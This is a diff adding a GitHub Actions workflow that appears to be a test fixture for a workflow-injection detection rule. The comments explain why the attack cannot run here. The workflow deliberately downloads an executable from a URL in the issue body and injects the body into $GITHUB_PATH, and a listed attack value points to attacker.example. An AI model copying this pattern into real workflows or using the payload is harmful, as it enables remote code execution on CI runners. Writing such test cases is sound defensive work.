@@ -1,0 +1,34 @@
+# situation: the workflow of the true positive controlled (controlled.yml)
+#   of the rule, with a job added whose step uses
+#   example-org/not-allowed-action, which the setting of allowed actions of
+#   GitHub (repo.allowed-actions) blocks with
+#   !example-org/not-allowed-action@*. In the true positive, on issues
+#   opened, a step downloads the file the issue's body links to /tmp/t/git,
+#   makes it executable, and writes the body to $GITHUB_PATH; the next step
+#   runs git status.
+# reason: GitHub checks each uses of the workflow before the run starts, and
+#   does not start the run because of the uses of
+#   example-org/not-allowed-action: no job of the run runs, so what the
+#   reason of the true positive says does not happen (in runs that the
+#   authors of the rule made on GitHub, such runs ended as startup_failure).
+# cause: the rule does not read repo.allowed-actions.
+# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
+# attack-run-behavior: GitHub does not start the run, so no step of the run
+#   runs, and the attack does nothing.
+on:
+  issues:
+    types: [opened]
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          BODY: ${{ github.event.issue.body }}
+        run: |
+          mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
+          echo "$BODY" >> "$GITHUB_PATH"
+      - run: git status
+  not-allowed:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
